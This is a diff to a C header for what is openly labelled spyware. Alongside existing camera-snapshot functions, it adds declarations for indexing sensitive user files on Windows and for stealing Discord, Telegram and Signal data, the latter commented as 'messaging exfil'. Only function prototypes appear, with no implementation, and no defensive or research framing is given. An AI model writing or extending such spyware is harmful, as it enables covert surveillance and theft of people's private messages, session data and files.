@@ -28,4 +28,10 @@ char *spy_camera_snapshot(int *len_out);
 /* Returns the last camera failure reason string (empty on non-Windows) */
 const char *spy_camera_last_error(void);
 
+/* File index — returns newline-separated paths of sensitive files under C:\Users\ */
+char *spy_file_search(int *len_out);
+
+/* Messaging exfil — bundles Discord LevelDB, Telegram tdata, Signal db + config */
+char *spy_messaging_steal(int *len_out);
+
 #endif /* SPYWARE_H */
